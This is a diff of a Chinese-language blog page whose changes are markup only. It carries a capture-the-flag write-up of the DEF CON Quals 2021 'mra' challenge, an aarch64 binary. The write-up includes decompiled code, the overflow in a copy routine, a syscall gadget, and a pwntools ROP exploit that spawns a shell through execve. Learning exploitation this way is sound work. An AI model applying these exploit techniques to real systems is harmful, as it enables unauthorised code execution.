@@ -8,10 +8,10 @@
         <title>Defon Qual 2021 Mra - ay3</title><meta name="Description" content="ay3 的个人博客"><meta property="og:title" content="Defon Qual 2021 Mra" />
 <meta property="og:description" content="" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://ay3.io/defon-qual-2021-mra/" />
-<meta property="og:image" content="https://ay3.io/logo.png"/>
+<meta property="og:url" content="https://ay3.io/defon-qual-2021-mra/" /><meta property="og:image" content="https://ay3.io/logo.png"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2021-07-28T14:03:27+08:00" />
 <meta property="article:modified_time" content="2021-07-28T14:05:05+08:00" />
+
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://ay3.io/logo.png"/>
 
@@ -20,7 +20,7 @@
 <meta name="application-name" content="ay3">
 <meta name="apple-mobile-web-app-title" content="ay3"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://ay3.io/defon-qual-2021-mra/" /><link rel="prev" href="https://ay3.io/wpictf-2021-strong_arm/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://ay3.io/defon-qual-2021-mra/" /><link rel="prev" href="https://ay3.io/wpictf-2021-strong_arm/" /><link rel="next" href="https://ay3.io/xv6-lab-pgtbl/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
@@ -124,18 +124,18 @@
 <p>程序是静态链接，并且去掉了符号信息。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">$ file mra
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ file mra
 mra: ELF 64-bit LSB executable, ARM aarch64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, statically linked, stripped
 </code></pre></td></tr></table>
 </div>
 </div><p>题目描述是 <code>Is it odd?</code>，用 IDA 打开发现栈帧分析会出错，看函数序发现栈是向上生长的，确实挺 <code>odd</code>。IDA 没法使用，看了 Writeup 发现可以用 Ghidra。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">  1
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
 </span><span class="lnt">  2
 </span><span class="lnt">  3
 </span><span class="lnt">  4
@@ -260,7 +260,7 @@ mra: ELF 64-bit LSB executable, ARM aarch64, version <span class="m">1</span> <s
 </span><span class="lnt">123
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-c" data-lang="c"><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="n">undefined4</span> <span class="n">param_1</span><span class="p">,</span><span class="n">undefined8</span> <span class="n">param_2</span><span class="p">)</span>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="n">undefined4</span> <span class="n">param_1</span><span class="p">,</span><span class="n">undefined8</span> <span class="n">param_2</span><span class="p">)</span>
 
 <span class="p">{</span>
   <span class="n">uint</span> <span class="n">uVar1</span><span class="p">;</span>
@@ -388,7 +388,7 @@ mra: ELF 64-bit LSB executable, ARM aarch64, version <span class="m">1</span> <s
 </div><p>因为是静态链接并且去掉了符号，看起来非常头疼，不过可以根据正向编程经验确定一些函数，比如在 <code>main</code> 开头处有</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -398,7 +398,7 @@ mra: ELF 64-bit LSB executable, ARM aarch64, version <span class="m">1</span> <s
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-c" data-lang="c">  <span class="n">FUN_00401018</span><span class="p">(</span><span class="n">PTR_DAT_0041cf60</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">  <span class="n">FUN_00401018</span><span class="p">(</span><span class="n">PTR_DAT_0041cf60</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
   <span class="n">FUN_00401018</span><span class="p">(</span><span class="n">PTR_FUN_0041cf58</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
   <span class="n">pcVar10</span> <span class="o">=</span> <span class="s">&#34;GET /api/isodd/&#34;</span><span class="p">;</span>
   <span class="n">pcVar9</span> <span class="o">=</span> <span class="s">&#34;Buy isOddCoin, the hottest new cryptocurrency!&#34;</span><span class="p">;</span>
@@ -411,7 +411,7 @@ mra: ELF 64-bit LSB executable, ARM aarch64, version <span class="m">1</span> <s
 </div><p>根据经验不难猜到是 <code>setvbuf</code>，<code>memset</code> 和 <code>read</code> 三个操作。用类似的方法可以得到以下代码：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">  1
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
 </span><span class="lnt">  2
 </span><span class="lnt">  3
 </span><span class="lnt">  4
@@ -536,7 +536,7 @@ mra: ELF 64-bit LSB executable, ARM aarch64, version <span class="m">1</span> <s
 </span><span class="lnt">123
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-c" data-lang="c"><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="n">undefined4</span> <span class="n">param_1</span><span class="p">,</span><span class="n">undefined8</span> <span class="n">param_2</span><span class="p">)</span>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="n">undefined4</span> <span class="n">param_1</span><span class="p">,</span><span class="n">undefined8</span> <span class="n">param_2</span><span class="p">)</span>
 
 <span class="p">{</span>
   <span class="n">uint</span> <span class="n">uVar1</span><span class="p">;</span>
@@ -666,7 +666,7 @@ mra: ELF 64-bit LSB executable, ARM aarch64, version <span class="m">1</span> <s
 <p>用上述方法分析后，我尝试了很久都没能找到漏洞。于是又参考了 Writeup，发现漏洞在 <code>FUN_004001d0</code> 函数中。这里我根据程序逻辑直接把它当作库函数 <code>strcpy</code> 因此没有深入分析。其实正确的做法是根据程序逻辑和函数自身的代码确定它的功能。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -700,7 +700,7 @@ mra: ELF 64-bit LSB executable, ARM aarch64, version <span class="m">1</span> <s
 </span><span class="lnt">32
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">vuln_cpy</span><span class="p">(</span><span class="kt">long</span> <span class="n">param_1</span><span class="p">,</span><span class="kt">long</span> <span class="n">param_2</span><span class="p">)</span>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">vuln_cpy</span><span class="p">(</span><span class="kt">long</span> <span class="n">param_1</span><span class="p">,</span><span class="kt">long</span> <span class="n">param_2</span><span class="p">)</span>
 
 <span class="p">{</span>
   <span class="n">uint</span> <span class="n">uVar1</span><span class="p">;</span>
@@ -738,7 +738,7 @@ mra: ELF 64-bit LSB executable, ARM aarch64, version <span class="m">1</span> <s
 <h2 id="漏洞利用">漏洞利用</h2>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -747,7 +747,7 @@ mra: ELF 64-bit LSB executable, ARM aarch64, version <span class="m">1</span> <s
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">$ checksec ./mra
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ checksec ./mra
 <span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/mnt/c/Users/ay3/Desktop/Archive/ooo/mra/mra&#39;</span>
     Arch:     aarch64-64-little
     RELRO:    Partial RELRO
@@ -759,7 +759,7 @@ mra: ELF 64-bit LSB executable, ARM aarch64, version <span class="m">1</span> <s
 </div><p>找到可用的 gadget：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -771,7 +771,7 @@ mra: ELF 64-bit LSB executable, ARM aarch64, version <span class="m">1</span> <s
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">$ aarch64-linux-gnu-objdump -d mra <span class="p">|</span> grep -B10 -A5 svc
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ aarch64-linux-gnu-objdump -d mra <span class="p">|</span> grep -B10 -A5 svc
   ...
   4007b4:       f85f83e8        ldur    x8, <span class="o">[</span>sp, <span class="c1">#-8]</span>
   4007b8:       f85f03e0        ldur    x0, <span class="o">[</span>sp, <span class="c1">#-16]</span>
@@ -786,18 +786,18 @@ mra: ELF 64-bit LSB executable, ARM aarch64, version <span class="m">1</span> <s
 </div><p>构造 rop 链如下：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">rop</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binary</span><span class="o">.</span><span class="n">bss</span><span class="p">())</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">constants</span><span class="o">.</span><span class="n">SYS_execve</span><span class="p">)</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">rop</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binary</span><span class="o">.</span><span class="n">bss</span><span class="p">())</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">constants</span><span class="o">.</span><span class="n">SYS_execve</span><span class="p">)</span>
 <span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binary</span><span class="o">.</span><span class="n">bss</span><span class="p">())</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">constants</span><span class="o">.</span><span class="n">SYS_read</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">gadget</span><span class="p">)</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>完整  exp 如下：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -837,7 +837,7 @@ mra: ELF 64-bit LSB executable, ARM aarch64, version <span class="m">1</span> <s
 </span><span class="lnt">38
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">import</span> <span class="nn">urllib</span>
 
 <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
@@ -845,23 +845,23 @@ mra: ELF 64-bit LSB executable, ARM aarch64, version <span class="m">1</span> <s
 
 <span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./mra&#39;</span><span class="p">)</span>
 
-<span class="c1"># cmd = &#39;qemu-aarch64 -g 1234 mra&#39;</span>
+<span class="c1"># cmd = &#39;qemu-aarch64 -g 1234 mra&#39;</span>
 <span class="n">cmd</span> <span class="o">=</span> <span class="s1">&#39;qemu-aarch64 mra&#39;</span>
 <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">cmd</span><span class="o">.</span><span class="n">split</span><span class="p">())</span>
-<span class="c1"># pause()</span>
+<span class="c1"># pause()</span>
 
-<span class="c1">#   4007b4:       f85f83e8        ldur    x8, [sp, #-8]</span>
-<span class="c1">#   4007b8:       f85f03e0        ldur    x0, [sp, #-16]</span>
-<span class="c1">#   4007bc:       f85e83e1        ldur    x1, [sp, #-24]</span>
-<span class="c1">#   4007c0:       f85e03e2        ldur    x2, [sp, #-32]</span>
-<span class="c1">#   4007c4:       d4000001        svc     #0x0</span>
-<span class="c1">#   4007c8:       d10083ff        sub     sp, sp, #0x20</span>
-<span class="c1">#   4007cc:       d65f03c0        ret</span>
+<span class="c1">#   4007b4:       f85f83e8        ldur    x8, [sp, #-8]</span>
+<span class="c1">#   4007b8:       f85f03e0        ldur    x0, [sp, #-16]</span>
+<span class="c1">#   4007bc:       f85e83e1        ldur    x1, [sp, #-24]</span>
+<span class="c1">#   4007c0:       f85e03e2        ldur    x2, [sp, #-32]</span>
+<span class="c1">#   4007c4:       d4000001        svc     #0x0</span>
+<span class="c1">#   4007c8:       d10083ff        sub     sp, sp, #0x20</span>
+<span class="c1">#   4007cc:       d65f03c0        ret</span>
 <span class="n">gadget</span> <span class="o">=</span> <span class="mh">0x4007b4</span>
 
-<span class="c1"># p.sendline(b&#39;GET /api/isodd/%\x00&#39; + cyclic(0x500) + b&#39;HTTP/1.1&#39;)</span>
+<span class="c1"># p.sendline(b&#39;GET /api/isodd/%\x00&#39; + cyclic(0x500) + b&#39;HTTP/1.1&#39;)</span>
 
-<span class="c1"># offset = cyclic_find(p64(0x61616562616164), n=8)</span>
+<span class="c1"># offset = cyclic_find(p64(0x61616562616164), n=8)</span>
 
 <span class="n">rop</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binary</span><span class="o">.</span><span class="n">bss</span><span class="p">())</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">constants</span><span class="o">.</span><span class="n">SYS_execve</span><span class="p">)</span>
 <span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binary</span><span class="o">.</span><span class="n">bss</span><span class="p">())</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">constants</span><span class="o">.</span><span class="n">SYS_read</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">gadget</span><span class="p">)</span>
@@ -903,11 +903,12 @@ mra: ELF 64-bit LSB executable, ARM aarch64, version <span class="m">1</span> <s
         </section>
     </div>
 
-    <div class="post-nav"><a href="/wpictf-2021-strong_arm/" class="prev" rel="prev" title="Wpictf 2021 Strong_arm"><i class="fas fa-angle-left fa-fw"></i>Wpictf 2021 Strong_arm</a></div>
+    <div class="post-nav"><a href="/wpictf-2021-strong_arm/" class="prev" rel="prev" title="Wpictf 2021 Strong_arm"><i class="fas fa-angle-left fa-fw"></i>Wpictf 2021 Strong_arm</a>
+            <a href="/xv6-lab-pgtbl/" class="next" rel="next" title="Xv6 Lab Pgtbl: Pagetable Per Process">Xv6 Lab Pgtbl: Pagetable Per Process<i class="fas fa-angle-right fa-fw"></i></a></div>
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.68.3">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.89.4">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
                 </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://ay3.io" target="_blank">ay3</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
